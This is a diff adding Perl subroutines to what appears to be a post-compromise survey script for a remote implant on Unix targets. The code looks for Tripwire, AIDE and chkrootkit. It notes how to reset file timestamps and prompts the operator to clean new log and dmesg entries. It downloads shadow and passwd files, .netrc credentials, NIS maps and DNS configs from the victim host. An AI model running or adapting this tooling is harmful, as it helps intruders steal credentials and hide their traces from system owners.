+	   "/usr/share/man/5*/twfiles*",
+	   "/usr/share/man/*8*/sig*",
+	   "/usr/share/man/*8*/trip*",
+	   "/usr/share/man/*8*/tw*",
+	   "/usr/TSS",
+	   "/usr/TSS/bin",
+	   "/usr/TSS/policy");
+  #  doit("-ls /opt/*/lib/tw.db* /opt/*/tw.db* /tmp/twz* /usr/lib/tw.db* /var/lib/tripwire*",
+#       "-ls /usr/local/*bin/sig* /usr/local/*bin/trip* /usr/local/*bin/twadmin*",
+#       "-ls /usr/local/trip* /usr/local/etc/trip* /usr/local/tw* /usr/local/etc/tw*",
+#       "-ls /usr/local/*bin/twprint* /usr/local/lib/tw.db* /usr/local/man/*4*/tw*",
+#       "-ls /usr/local/man/5*/twfiles* /usr/local/man/*8*/trip* /usr/man/*4*/tw*",
+#       "-ls /usr/man/5*/twfiles* /usr/man/*8*/trip* /usr/man/*8*/tw*",
+#       "-ls /usr/share/man/*4*/tw* /usr/share/man/5*/twfiles* /usr/share/man/*8*/sig*",
+#       "-ls /usr/share/man/*8*/trip* /usr/share/man/*8*/tw* /usr/TSS /usr/TSS/bin",
+#       "-ls /usr/TSS/policy");
+  if ($solaristarget) {
+    doit("# aset",
+         "${minus}grep aset /var/spool/cron/crontabs/*",);
+    nopenlss("-R",
+	     "/usr/aset",
+	    );
+  }
+
+  my $recurse = "";
+  $recurse = "r" if ($linuxtarget);
+  # Check for AIDE, chkrootkit, chkrtkt.
+  doit("# AIDE",
+       "${minus}grep -${recurse}i aide /etc/cron",
+      );
+  nopenaddpath("/usr/local/bin","/usr/local/sbin");
+  nopenlss("-FP",
+           "*aide*",
+	  );
+  nopenlss("-R",
+           "/var/lib/aide",
+	   "/etc/aide",
+	  );
+  my ($outputa,$nopenlinesa,@outputa) = 
+    doit("# AIDE-related files in find",
+	 "-lsh egrep -i \"aide|chkrootkit|chkrtkt\" $findfile | grep -v Adelaide"
+	);
+  if (my @rootkit = grep /chkr/,@outputa) {
+    offerabort($COLOR_FAILURE."\n\n ".
+	       join("\n ",@outputa)."\n\n".
+	       "The above needs looking at.");
+  }
+}
+#END gstripwire
+
+sub gsrootkit {
+  doit(
+       "# checksum some of the usual suspects",
+       "# We -ls first to see access times before we access them with our -sha1sum",
+      );
+  my ($outputroot,$nopenlinesroot,@outputroot) =
+    nopenlss("-PU",
+	     "modload",
+     ) if $solaristarget;
+  my ($outputroot,$nopenlinesroot,@outputroot) =
+    nopenlss("-PU",
+	     "find",
+	     "ls",
+	     "netstat",
+	     "ps",
+	     "rm",
+	     "sh",
+	     "su",
+	     "telnet",
+	     "w",
+	     "arp",
+	     "find",
+	     "telnet",
+	     "w",
+	     "ftpd",
+	     "remshd",
+	     "rlogind",
+	     "telnetd",
+	     "arp",
+	     "*ftpd",
+	     "*inetd",
+	     "modinfo",
+	     "netstat",
+	     "*rlogind",
+	     "*rshd",
+	     "*telnetd",
+	     "ps",
+	     "login",
+	     "/dev"
+	    );
+  my @filesfound = ();
+  processnopenls(\@filesfound,0,1,-1,$outputroot,$nopenlinesroot,@outputroot) ;
+  progprint($COLOR_FAILURE."\n\n".
+	    "Following -touch -t commands can set atime and mtime times back to before\n".
+	    "we got here, and ctimes can be found in:\n".
+	    $cmdoutfile);
+  nopenlss("-nQU",@filesfound);
+  doit("-sha1sum @filesfound");
+  offerabort("Pausing here to let you see the -sha1sum output above.\n".
+	     "Simply re-do -gs survey if you abort here.");
+  my ($output,$nopenlines,@output) = doit
+    (
+     "# the following is from chkrootkit and elsewhere",
+     "# libX.a rootkit",
+     "-ls -nR /usr/lib/libX.a",
+     "-ls -R /usr/lib/libX.a",
+    ) unless ($freebsdtarget);
+  ($output,$nopenlines,@output) = doit
+    (
+     "# the following is from chkrootkit and elsewhere",
+     "# libX.a rootkit",
+     "-ls -n /usr/lib/libX.a",
+     "-ls /usr/lib/libX.a",
+    ) if ($freebsdtarget);
+  my ($foundrps) = grep m, /.*/rps$, , split(/\n+/,$output);
+  my ($foundnetstat) = grep m, /.*/netstat$, , split(/\n+/,$output);
+  my $fixpath = 0;
+  if ($foundnetstat =~ m, (/.*/netstat$),) {
+    offerabort("The libX.a rootkit is there. Will run rps and netstat if there.",
+	       "CONTINUE");
+    $foundnetstat = $1;
+    preservefile("$opdown/netstat.$nopen_rhostname.WITHlibX.a.netstat");
+     # We keep this netstat in down/ not in targetcommands/, we tweaked it.
+    ($output,$nopenlines,@output) = doit("$foundnetstat -an ; $foundnetstat -rn >T:$opdown/netstat.$nopen_rhostname.WITHlibX.a.netstat");
+    if (@output > 8) {
+      $fixpath++;
+    } else {
+      $foundnetstat = "";
+    }
+  } else {
+    $foundnetstat = "";
+  }
+  my ($changesmade,$newdir)=();
+  if ($foundrps =~ m, (/.*/rps$),) {
+    $foundrps = $1;
+    $newdir = dirname($foundrps);
+    $newdir =~ s,/+$,,;
+    $newdir =~ s,\s*$,,;
+    $newdir =~ s,^\s*,,;
+    my ($newline,$oldline) = nopenaddalias("=ps",$foundrps,1,1);
+    my ($oldsyntax) = $oldline =~ /=ps=.*ps\s*(.*)/;
+    my ($runrps) = $newline =~ /=ps=([^\r\n]*)/;
+    preservefile("$opdown/ps.$nopen_rhostname.WITHlibX.a.rps");
+    ($output,$nopenlines,@output) =
+      doit("$foundrps $oldsyntax >T:$opdown/ps.$nopen_rhostname.WITHlibX.a.rps");
+    my $looksbad = 1 if scalar @output < 5;
+    $looksbad++ if $output =~ /cannot find.* in ISA/;
+    my ($default,$morebad) = ("Y","");
+    $fixpath++ unless $looksbad;
+    if ($looksbad) {
+      $default = "N";
+      $morebad = "$COLOR_FAILURE\n(Default is NO as the ps output above looks bad.)$COLOR_NORMAL\n";
+    }
+    my $morenetstat = "The libX.a/bin/netstat -an & -rn output is above\n".
+      "(also saved locally to $opdown/netstat.$nopen_rhostname.WITHlibX.a.netstat)\n"
+	if $foundnetstat;
+    my ($ans,$longans) = mygetinput
+      (
+       $morenetstat.
+       "NEW ALIAS WOULD BE: $COLOR_NOTE $newline$COLOR_NORMAL\n".
+       $morebad.
+       "Do you want to change the =ps alias to the new one above?",$default
+      );
+    if ($ans eq "y") {
+      nopenaddalias("=ps",$foundrps,1);
+      $changesmade++;
+      $fixpath++;
+    }
+  }
+  if ($fixpath and $newdir) {
+    my $morenetstats = "?";
+    $morenetstats = "\n(the above netstats seemed to work)?"
+      if $foundnetstat;
+    my ($ans,$longans) = mygetinput
+      ("Do you want to add $newdir to your path in\n".
+       "this and future windows on $nopen_rhostname".
+       $morenetstats,
+       "Y"
+      );
+    $allwindows = 1; # Set true so nopenaddpath is used in all windows
+    if ($ans eq "y") {
+      nopenaddpath($newdir);
+      $changesmade++;
+    }
+  }
+  offerabort
+    ("Your PATH and/or =ps alias were just modified. Any new sessions to\n".
+     "$nopen_rhostname will inherit these new settings. \n\n".
+     "For this to take effect in your other windows currently on this target, run\n".
+     "\"-gs auto\" in those windows.",
+     "CONTINUE"
+    ) if $changesmade;
+
+  doit(
+       "# Ramen Worm",
+       "${minus}grep ${caret}asp /etc/inetd.conf",
+       "${notbuiltincomment}-grep ${caret}asp /etc/inet/inetd.conf",
+
+       "# Various network backdoors",
+       "${skipping}netstat -an | egrep '(^tcp.*LISTEN|^udp)' | egrep '(114 |145 |465 |511 |600 |1008 |1524 |1999 |2881 |3133 |3879 |4369 |5665 |10008 |12321 |23132 |27374 |29364 |31336 |31337 |45454 |47017 |47889 |60001 )'",
+
+       "# adore or knark Linux Kernel Module",
+       "${skipping}egrep -i '(adore|knark)' /proc/ksyms ",
+       "${notbuiltincomment}-grep -i 'adore' /proc/ksyms ",
+       "${notbuiltincomment}-grep -i 'knark' /proc/ksyms ",
+
+       "# misc suspicious files",
+       "${skipping}find /dev -type f",
+
+       "# the following is from RootKit für SunOS by NSDAP",
+
+       "# ulogin trojan",
+       "-ls /bin/xlogin /sbin/xlogin",
+
+       "# Uni-PS trojan by {MANIAC}",
+       "-ls /lib/ldlibps.so",
+
+       "# t0rnkit v7 or rip rootkit",
+       "-ls /usr/src/.puta /usr/info/.t0rn /usr/src/linux/arch/alpha/lib/.lib",
+
+       "# X-Org Linux rootkit",
+       "-ls /lib/security/.config",
+
+       "# RameN Worm ",
+       "-ls /usr/src/.poop",
+
+       "# aPa rootkit",
+       "-ls /usr/share/.aPa",
+
+       "# dua rootkit",
+       "-ls /usr/bin/duarawkz /usr/bin/duarawkz/loginpass",
+
+       "# sshd trojan (look in /etc/rc2)",
+       "-ls /usr/lib/dmis/dmisd",
+
+       "# misc directories",
+       "-ls -d /var/run/.tmp /usr/man/man1/lib/.lib /bin/... /usr/share/man/mansps",
+
+       "# the following is from chkrootkit",
+
+       "# misc suspicious files",
+       "-ls /var/run/.tmp /usr/man/man1/lib/.lib /usr/man/man2/.man8 /usr/man/man1/..\\\ *",
+
+       "# TeLeKiT telnetd trojan",
+       "-ls /usr/info/libc1.so",
+      );
+  tickleifneedbe($builtinsonly);
+
+  # Split off all the /dev/ stuff. We do not want to refer to anything in /dev
+  # directly as that can try to load modules. Just a single -ls of /dev,
+  # then we parse that looking for our hits. Note this does not recurse /dev/.
+  my ($outputdev,$nopenlines,@outputdev) =
+    nopenlss("-U",
+	     "/dev"
+	    );
+  my %devlookfor =
+    (
+     "# TeLeKiT telnetd trojan",
+     "hda06",
+
+     "# tribe bot",
+     "wd4",
+
+     "# Danny-Boys Abuse Kit",
+     "mdev",
+
+     "# langsuir",
+     "ptyas",
+
+     "# misc directories",
+     "portd|/\\.\\.\\.|\\.lib",
+
+     "# misc files",
+     "ptyy|ptyu|ptyq|ptyv|hdbb",
+    );
+  my $devoutput = "";
+  foreach my $comment (keys %devlookfor) {
+    my $str = $devlookfor{$comment};
+    my ($more,$es) = ();
+    foreach my $line (@outputdev) {
+      next unless $line =~
+	m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d+\s+\d+:\d+\s+\d{4}\s+(.*($str).*),;
+      if ($line =~ m,^l.*\d{4} (/dev/.*) -[\.\>\-] (.*),) {
+	my ($outputdev2,$nopenlines,@outputdev2) =
+	  nopenlss("-U","-Qd",
+		   "/dev/$2"
+	    );
+	next if $outputdev2 =~ /^c/;
+      }
+      $es = "es" if $more;
+      $more .= "$line\n";
+    }
+    if ($more) {
+      $devoutput .= $COLOR_FAILURE.
+	"# In /dev, match$es of \"$str\" ($comment):\n".
+	$COLOR_NORMAL.
+	$more;
+    }
+  }
+  if ($devoutput) {
+    offerabort($COLOR_FAILURE.
+	       "# /dev ISSUES\n\n".
+	       $COLOR_NORMAL.
+	       $devoutput.
+	       $COLOR_FAILURE.
+	       "\n\n".
+	       "# Check of /dev shows the issues above.");
+  }
+  tickleifneedbe($builtinsonly);
+  doit(
+       "# t0rn rootkit or Lion Worm",
+       "-lsh egrep \"libproc.a|1i0n.sh\" $findfile",
+      );
+  tickleifneedbe($builtinsonly);
+  doit(
+       "# ark",
+       "-lsh grep ptyxx $findfile",
+       "#-lsh grep '.ark.*' $findfile",
+      );
+  tickleifneedbe($builtinsonly);
+  doit(
+       "# rk17",
+       "-lsh egrep '(rtty|squit|pback|psid|kset|autod.o|gib|number.cgi|void.cgi|last.cgi)' $findfile",
+      );
+  tickleifneedbe($builtinsonly);
+  doit(
+       "# rsha",
+       "-lsh egrep '(kr4p|n3stat|chsh2|alpha/lib/.lib)' $findfile",
+      );
+  tickleifneedbe($builtinsonly);
+  doit(
+       "# ShitC Worm",
+       "-lsh egrep '(frgy|in.slogind)' $findfile",
+      );
+  tickleifneedbe($builtinsonly);
+  doit(
+       "# Omega Worm",
+       "#-lsh grep chr $findfile",
+      );
+  tickleifneedbe($builtinsonly);
+  doit(
+       "# rh-sharpe",
+       "#-lsh egrep '(lpstree|lkillall|ldu|lnetstat)' $findfile",
+       "-lsh egrep '(lpstree|lkillall|ldu|lnetstat)' $findfile",
+      );
+  tickleifneedbe($builtinsonly);
+  my $oddfiles = "$opdown/survey.oddfilesinfind.$nopen_rhostname";
+  preservefile($oddfiles);
+  my $X = "${COLOR_WARNING}X$COLOR_NORMAL";
+  my $TTTAABBB = "${COLOR_MYRED}T$COLOR_NORMAL";
+  doit(
+       "# misc suspicious files in local *find: ANY SPACES OR DOT-COMMA OR COMMA-DOT OR PIPES OR DOT-DOT-DOT OR COULDNOTGETTABSTOWORKRIGHT  TO TMPFILE",
+       "-lsh egrep \"[^/]* .*/(\\\ |\\\\||.,|,.|\\\\.\\\\.\\\\.\\\\.*/)\" $findfile | tee $oddfiles",
+  );
+  if (-s $oddfiles) {
+    progprint($COLOR_FAILURE."\n\n\nODD FILES IN FIND\n\n\nODD FILES IN FIND");
+    sleep 3;
+    doit(
+         "# $oddfiles with SPACES shown as $X and TABS as $TTTAABBB",
+         "-lsh sed \"s, ,$X,g\" $oddfiles | sed \"s,\\\\t,$TTTAABBB,g\" ; echo === ; echo TMPFILE=$oddfiles ; echo === ; cat $oddfiles",
+        );
+    sleep 3;
+    offerabort($COLOR_FAILURE."ODD FILES IN FIND\n\nABOVE WE REPLACED ALL SPACES WITH $X AND TABS AS $TTTAABBB TO COMPARE WITH $oddfiles");
+  }
+  tickleifneedbe($builtinsonly);
+}
+#END gsrootkit
+
+sub gsident {
+  #nopengetfiles("SIZEMAX=20000",
+  nopenlss("-${forcepull}GYZM20000",
+		"/etc/*release*",
+		"/etc/*redhat*",
+		"/etc/*debian*",
+		"/usr/lib/setup/*slack*version*",
+		"/etc/*slack*version*",
+                "/etc/*issue*",
+   	        "/etc/motd*",
+	       );
+
+  my @releasefiles = split(/\n/,`ls -cart $opdown/$nopen_rhostname/etc/*{release,issue,motd,slack,redhat,debian}* | sort -u`);
+  my ($content,%donealready) = ();
+  foreach my $file (@releasefiles) {
+    if (-s $file) {
+      my $sum = `cat $file | md5sum`;
+      next if $donealready{$sum}++;
+      $content .= "$file\n".
+	"\n".
+	'#' x 80 .
+	"\n".
+	`cat $file`.
+	'#' x 80;
+      filepopup($file,"-geometry 88x10+25+$popupoffset -bg white -fg blue",noage);
+      $popupoffset += 180;
+    }
+  }
+  progprint(".\n\n".
+	    "Just popped up the following files, content shown here also:\n\n".
+	    $content.
+	    "");
+}
+#END gsident
+
+sub gshardware {
+    # Check to see what OS we are.
+    if ($linuxtarget) {
+	# This code is deprecated; the kernel symbols are retrieved elsewhere now.
+	#my $ksymstofile = " >>T:/current/.k.tmp" unless $skipping;
+	#doit(
+	#       "${skipping}/sbin/ksyms -a$ksymstofile",
+	#       "${skipping}-lsh echo \"[/sbin/ksyms -a]\" >> /current/down/linuxstats.cmdout.$nopen_rhostname  ; cat /current/.k.tmp >> /current/down/linuxstats.cmdout.$nopen_rhostname ;  rm /current/.k.tmp",
+	#     );
+	
+	# Call autokernelstuff.linux to get the kernel-related files from the target.
+	my @autoargv = ($forcepull2);
+	mydo("autokernelstuff.linux",@autoargv);
+	
+	# Also retrieve bootloader-related files.
+	nopenlss("-UFQzZRGYM100000",
+		 "/boot/lilo.conf*",
+		 "/boot/grub.conf*",
+		 "/boot/grub/grub.conf*",
+		 "/boot/grub/menu.lst*",
+		 "/boot/grub/device.map*",
+		 "/etc/lilo.conf*",
+		 "/etc/grub.conf*",
+		 "/etc/grub.d/*",
+		 );
+	my ($ans) = mygetinput
+	    ("About to run sysctl -a. That may generate kernel logs matching:\n".
+	     "  kernel.*sysctl\n\n".
+	     "which may also show up in /var/log/messages  or elsewhere, as well.\n\n".
+	     "You will be shown a BEFORE and AFTER grep on /var/log/* looking for\n".
+	     "kernel.*sysctl.\n\n".
+	     "You can SKIP this if you want to avoid that cleaning.\n\n".
+	     "<C>ontinue or <S>kip it?","C","S","CONTINUE","SKIP");
+	unless ($ans eq "s") {
+	    progprint($COLOR_FAILURE.
+		      "\n\n\nLOGS MATCHING \"sysctl\" BEFORE\n\n\n");
+	    my (%loggedinbefore,
+		@loggedinbefore,
+		@loggedinafter,
+		%cleanmatches,
+		) = ();
+	    my (undef,undef,@loggedinbefore) = doit("grep -l kernel.*sysctl /var/log/*");
+	    for my $logfile (@loggedinbefore) {
+		$loggedinbefore{$logfile}++;
+		my (undef,undef,@matches) = doit("grep kernel.*sysctl $logfile");
+		foreach my $match (@matches) {
+		    $cleanmatches{$match}++;
+		}
+	    }
+	    sleep 3;
+	    doitwrite("sysctl -a ; echo");
+	    my (undef,undef,@loggedinafter) = doit("grep -l kernel.*sysctl /var/log/*");
+	    my $warning = "";
+	    for my $logfile (@loggedinafter) {
+		$loggedinbefore{$logfile}++;
+		my (undef,undef,@matches) = doit("grep kernel.*sysctl $logfile");
+		foreach my $match (@matches) {
+		    next if $cleanmatches{$match};
+		    $warning .= "$match\n";
+		}
+	    }
+	    my (undef,undef,@dmesgoutput) = doitwrite("dmesg ; echo");
+	    progprint($COLOR_FAILURE.
+		      "\n\n\nLOGS MATCHING \"sysctl\" AFTER\n\n\n");
+	    @dmesgoutput = grep /kernel.*sysctl/ , @dmesgoutput;
+	    if ($warning) {
+		$warning .= "\n\n".
+		    "and these lines are now in dmesg output, as well:\n\n".
+		    join("\n",@dmesgoutput).
+		    "\n\n"  if @dmesgoutput;
+		offerabort
+		    ($COLOR_FAILURE.
+		     "WARNING:  These log lines seem to be from just now running sysctl -a.\n$COLOR_NORMAL\n".
+		     $warning.
+		     "Either abort here to clean them now, or use another window to do so.\n".
+		     "Also note the dmesg output cannot be partially cleaned, though a \"dmesg -c\"\n".
+		     "will print and then WIPE the contents of that ring buffer. You need\n".
+		     "permission to do that.".
+		     "");
+	    } else {
+		progprint($COLOR_FAILURE. "NONE match kernel.*sysctl.");
+		sleep 3;
+	    }
+	}
+    } elsif ($solaristarget) {
+   # check to see if the PID of init is 1
+   if ($sol10target) {
+     #dbg("in autosurvey gshardware, solaristarget =$solaristarget=, sol10target =$sol10target=");
+     my $line="";
+     my @lines;
+     unless (-s "$opdown/ps.$nopen_rhostname") {
+       # If none yet, we want one. offerabort() if we are supposed to skip 
+       if ($skipping) {
+	 offerabort
+	   ("You are on a Solaris 10 target, and chose to skip non-builtins.\n".
+	    "However, on Solaris 10, we need to do a =ps to see if init is 1.\n"
+	   );
+       }
+       doit("=ps >T:$opdown/ps.$nopen_rhostname");
+     }
+     sleep 5;
+     if (-s "$opdown/ps.$nopen_rhostname") {
+        # use the existing ps output to find our inits
+        #dbg("in autosurvey gshardware, reading ps.$nopen_rhostname");
+        open PSIN,"<$opdown/ps.$nopen_rhostname" or mydie("Unable to read ps list");
+        foreach my $initline (<PSIN>) {
+           my @fields = split(/\s+/,$initline);
+	   next unless $initline =~  /\d:\d\d\s+(\/\S+(\/){0,1}){0,1}init\s*.*$/i;
+           #next unless @fields[scalar @fields - 1] =~ /init/i;
+           #dbg("in autosurvey gshardware, found init line =$initline=");
+           push @lines,$initline;
+        }
+        close PSIN;
+     }
+#     else {
+#        # get a fresh listing with just the init lines
+#        #dbg("in autosurvey gshardware, running ps");
+#        my ($output,$nopenlines,@output) = doit(
+#              "${skipping}=ps | grep init | grep -v grep",
+#           );
+#        foreach my $initline (@output) {
+#	   next unless $initline =~  /\d:\d\d\s+(\/\S+(\/){0,1}){0,1}init\s*.*$/i;
+#           my @fields = split(/\s+/,$initline);
+#           next unless @fields[scalar @fields - 1] =~ /init/i;
+#           #dbg("in autosurvey gshardware, found init line =$initline=");
+#           push @lines,$initline;
+#        }
+#     }
+     my @pids;
+     #my @imagepaths;
+     my $count=0;
+     my $nowarningtext=0;
+     # check each entry of the array for a PID of 1
+     foreach $line (@lines) {
+        my $tmpline = $line;
+        $tmpline =~ s/^\s+// ;  
+        my @fields = split(/\s+/,$tmpline);
+        # grab the second field, we don't need the image name anymore
+        my $pid = @fields[1];
+        #my $imagepath = @fields[scalar @fields - 1] if @fields[$#fields] =~ /init/i;
+        #dbg("in autosurvey gshardware, pid =$pid=, imagepath =$imagepath=");
+        $count++ unless $pid == 1;
+        push @pids,$pid;
+        #push @imagepaths,$imagepath;
+     }
+     dbg("in autosurvey gshardware, count of extra init pids =$count=");
+
+     my $warningtext="$COLOR_FAILURE
+
+The PID of /sbin/init is not 1; ";
+     if ($count == 1) {
+        $warningtext .= "it is @pids[1]";
+     }
+     elsif ($count > 1) {
+        $warningtext .= "the PIDs of multiple init processes are ";
+        foreach my $pid (@pids) { $warningtext .= "$pid "; }
+     }
+     $warningtext .= "\n$COLOR_NORMAL
+
+You may be inside a Solaris 10 zone.\n";
+
+     # now check to see if there is not at least one PID of 1 in the array
+     foreach my $pid (@pids) {
+        next if $pid > 1;
+        $nowarningtext++;
+        last;
+     }
+     offerabort($warningtext) unless $nowarningtext;
+   }
+
+   preservefile("$optargetcommands/pkginfo.$nopen_rhostname");
+   preservefile("$optargetcommands/showrev.all.$nopen_rhostname");
+   my $pkginfotofile = " >L:/$opdown/pkginfo.$nopen_rhostname" unless $skipping;
+   my $showrevtofile = " >L:/$opdown/showrev.all.$nopen_rhostname" unless $skipping;
+   doit(
+#         "${skipping}eeprom",
+#         "${skipping}isainfo -bv",
+#         "${skipping}isainfo -kv",
+#         "${skipping}isainfo -nv",
+         "${skipping}isalist",
+         "# pkginfo NO LONGER PRINTED TO SCREEN",
+         "${skipping}pkginfo$pkginfotofile",
+         "${skipping}psrinfo -v",
+	 "${skipping}showrev",
+	 "# showrev -a NO LONGER PRINTED TO SCREEN",
+         "${skipping}showrev -a$showrevtofile",
+#         "${skipping}prtconf -V",
+	 "-cat /etc/dfs/dfstab",
+       );
+   unless ($builtinsonly) {
+     my @baddirs =
+       (
+        "/",
+	"/lib",
+	"/var",
+	"/usr",
+       );
+     ($shareout,$nopenlines,@shareout) = doit("share");
+     my $prepend = ".\n\n\n\n${COLOR_FAILURE}NOTE:${COLOR_NORMAL} The following partitions are shared via NFS:\n\n";
+     my $list = "";
+     my $append = "\n\n${COLOR_FAILURE}WARNING: Potentially bad NFS shares are colored red above.\n\n";
+     my $showwarning = 0;
+     foreach $line (@shareout) {
+       #dbg("in autosurvey gshardware, got line =$line=");
+       next unless $line =~ /\s+(\/\S*)\s+(\S+=?)\s+("?\S*"?).*$/;
+       #dbg("in autosurvey gshardware, got line from share: \$1 = =$1=, \$2 = =$2=, \$3 = =$3=");
+       my $typestring = "read-only";
+       my $type = $2;
+       my $dir = $1;
+       my $desc = $3;
+       $typestring = "read-write" if $type =~ /rw=?.*/;
+       #dbg("in autosurvey gshardware, showing line: =$dir= =$typestring= =$desc=");
+       if (grep {/$dir/} @baddirs) {
+         $showwarning++;
+         $list .= "\t\n${COLOR_FAILURE}$dir is shared $typestring";
+       }
+       else {
+         $list .= "\t\n$dir is shared $typestring";
+       }
+       unless ($desc == "") {
+         $list .= " (description: $desc)";
+       }
+     }
+     $list .= "${COLOR_NORMAL}\n\n\n";
+     if ($shareout) {
+       my $text = "";
+       $text .= "$prepend$list";
+       $text .= "$append" if $showwarning;
+       progprint("$text");
+     }
+   }
+ }
+ elsif ($hpuxtarget) {
+   doitwrite(
+	     "${skipping}/opt/ignite/bin/print_manifest",
+	     "${skipping}swapinfo -t",
+	     );
+   doit(
+	 "-ls /etc/loadmods",
+	 "-cat /etc/loadmods",
+       );
+ }
+ elsif ($aixtarget) {
+   doit(
+         "${skipping}oslevel",
+         "${skipping}lslpp -L all",
+         "${skipping}genkex",
+         "${skipping}lscfg -v",
+         "${skipping}lsattr -EHl sys0",
+         "${skipping}lsattr -EHl proc0",
+         "${skipping}bootinfo -T",
+         "${skipping}bootinfo -y",
+         "-ls /usr/lib/boot",
+         "-cat /etc/inittab",
+         "-ls /usr/lib/drivers/",
+         "${skipping}prtconf",
+       );
+ }
+
+ # All platforms get a -gs arp in survey mode, without -P so they get popups
+  mydo("autoarp")
+    unless ($builtinsonly);
+
+}
+#END gshardware
+
+sub gsgets {
+  # NOTE: Some Linux systems prepend and append characters to the names
+  # of the passwd and shadow files.
+  # Adding wildcards to those names should ensure that they are retrieved.
+#  my @getfiles =  
+#  nopengetfiles("TAILBYTESSIZEMAX=200000",@getfiles);
+  nopenlss("-${forcepull}GUoRM200000","-T${maxbw}",
+     "/.netrc",
+     "/.rhosts",
+     "/etc/aliases",
+     "/etc/dfs/dfstab",
+     "/etc/exports",
+     "/etc/fstab",
+     "/etc/ftpusers",
+     "/etc/group",
+     "/etc/host.conf",
+     "/etc/hosts",
+     "/etc/hosts.allow",
+     "/etc/hosts.deny",
+     "/etc/hosts.equiv",
+     "/etc/inetd.conf",
+     "/etc/inet/inetd.conf",
+     "/etc/inet/hosts",
+     "/etc/nsswitch.conf",
+     "/etc/*issue*",
+     "/etc/mail/aliases",
+     "/etc/mail/sendmail.cf",
+     "/etc/master.passwd",
+     "/etc/mnttab",
+     "/etc/nsswitch.conf",
+     "/etc/*passwd*",
+     "/etc/postfix/main.cf",
+     "/etc/*release*",
+     "/etc/rmtab",
+     "/etc/security/passwd",
+     "/etc/sendmail.cf",
+     "/etc/*shadow*",
+     "/etc/syslog.conf",
+     "/etc/vfstab",
+     "/etc/xinetd*",
+     "/var/adm/messages",
+     "/var/log/syslog",
+     "/var/log/messages",
+    );
+
+  
+  # Set up to collect more .netrc files.
+  my ($userlist,@userdirs) = parseuserdirs($nopen_rhostname,2000,"the gsgets() survey");
+  unless (@userdirs) {
+    offerabort
+      ("$COLOR_FAILURE\n".
+       "No list of remote users....has the \"-gs auto\" (a.k.a. autodone) been\n".
+       "done yet? If not, you may want to abort here then re-run -gs survey\n".
+       "once autodone has completed.".
+       "");
+  }
+  @getfiles = ();
+  my $maxsize = 32768;
+  foreach my $dir (@userdirs) {
+    push(@getfiles,
+	 "$dir/.netrc",
+	);
+  } 
+  #nopengetfiles("SIZEMAX=$maxsize GETZERO=1", @getfiles);
+  nopenlss("-${forcepull}GM$maxsize", @getfiles);
+  
+  # Set up to find and collect the rest of the .netrc files.
+  @getfiles = ();
+  ($netrcgrep,$nopenlines,@netrcgrep) = doit("-lsh -nohist egrep \"\.netrc\" $opdown/cmdout/${nopen_rhostname}-find");
+  foreach $line (@netrcgrep) {
+    #dbg("in autosurvey gsgets, checking line =$line=");
+    next unless $line =~ /.*\s\|\s(\/.*\/\.netrc)$/;
+    next if grep {/$1/} @getfiles;
+    #dbg("in autosurvey gsgets, pushing path =$1=");
+    push(@getfiles,$1);
+  }
+  #nopengetfiles("SIZEMAX=$maxsize GETZERO=1",@getfiles);
+  nopenlss("-${forcepull}GM$maxsize",@getfiles);
+  
+  # Look for and download potential NIS maps on target.
+  $maxsize = 10485760;
+  nopenlss("-${forcepull}GUzZoR","-T${maxbw}","-M$maxsize",
+           "/var/yp");
+
+  if ($freebsdtarget) {
+    nopenlss("-${forcepull}GYFM100000",
+	     "/etc/hosts*",
+	     "/etc/syslog.conf",
+	     "/etc/inetd.conf",
+	     "/etc/resolv.conf",
+	     "/etc/passwd*",
+	     "/etc/shadow*",
+	     "/etc/rc.conf",
+	     "/boot/loader.conf",
+	     "/var/etc/hosts*",
+	     "/var/log/messages*",
+	    );
+    my ($bsduname) = doitwrite("uname -v");
+    if ($bsduname) {
+      my $gotkernel = 0;
+      my ($hostname) = doitwrite("hostname -s");
+      my ($kernel) = doit("sysctl kern.bootfile ; echo");
+      chomp($kernel);
+      my $size = 500*1024*1024;
+      if (grep /$hostname/i, $bsduname) {
+	#my ($stamp) = doit("-ls -n $kernel");
+	($kernel) = $kernel =~ m,bootfile: (\/.*),;
+	progprint($COLOR_FAILURE."\n\nPulling the target's$COLOR_NOTE CUSTOM$COLOR_FAILURE kernel\n\n");
+	nopenlss("-${forcepull}GYFM$size",$kernel);
+	#doit($stamp);
+	$gotkernel++;
+      }
+      nopenlss("-${forcepull}GYFM$size",$kernel)
+	unless ($gotkernel or $bsduname =~ /RELEASE/);
+    }
+  }
+
+}
+#gsgets
+
+sub gsls {
+  nopenlss("-UQ",
+           "/etc",
+	   "/etc/mail","/etc/sendmail*","/etc/postfix",
+	  );
+  nopenlss("-UQ",
+	   "/usr/local","/usr/local/bin","/usr/local/src",
+	  );
+  nopenlss("-UQ",
+	   "/var/lib/mysql",
+	   "/var/yp",
+      );
+}
+#gsls
+
+sub gsdns {
+  my @getdns =
+    (
+     "/etc/bind*",
+     "/etc/named*",
+     "/etc/*ndc*",
+     "/usr/local/etc/named*",
+     "/var/named*",
+     "/var/run/named*",
+    );
+  my @getdnsextra =
+    (
+     "/var/log/bind*",
+     "/var/log/named*",
+    );
+    
+  nopenlss("-UQ", 
+           "/sbin/named*","/usr/sbin/named*","/usr/local/sbin/named*",
+           "/sbin/*ndc*","/usr/sbin/*ndc*","/usr/local/sbin/*ndc*",
+          );
+  
+  # Retrieve all of the DNS-related files at the paths shown above.
+  nopenlss("-${forcepull}GUzZoR","-M5242880","-T${maxbw}",@getdns);
+  nopenlss("-${forcepull}GUzZoR","-M5242880","-T${maxbw}",@getdnsextra);
+}
+#gsdns
+
+sub gshistories {
+  # Now using require autohistories after setting @ARGV to our -histories arguments.
+  my @orig = @ARGV;
+  @ARGV = ("-xa0");
+  require "$opetc/autohistories";
+#dbg("After require$opetc/autohistories");
+  # equivalent of:
+  #doit("-gs histories -xa0");
+  @ARGV = @orig;
+}
+#gshistories
+
+sub gschecksyslogs {
+  my @syslogfiles = sort
+    split(/\n/,`find $opdown/$nopen_rhostname -type f 2>/dev/null| grep syslog.*conf`);
+  my $logcontent = "";
+  my %donesums = () ;
+  my @odddirs = ();
+  foreach $syslogfile (@syslogfiles) {
+    chomp(my $sum = `sum $syslogfile`) ;
+    next if ($sum and $donesums{$sum}++) ;
+    my $shortname = $syslogfile;
+    $shortname =~ s/.*$nopen_rhostname//;
+    $logcontent .= 
+      $COLOR_FAILURE.
+      "\n#$COLOR_NOTE from $shortname\n".
+      $COLOR_FAILURE.
+      '#' x 80 .
+      $COLOR_NORMAL.
+      "\n";
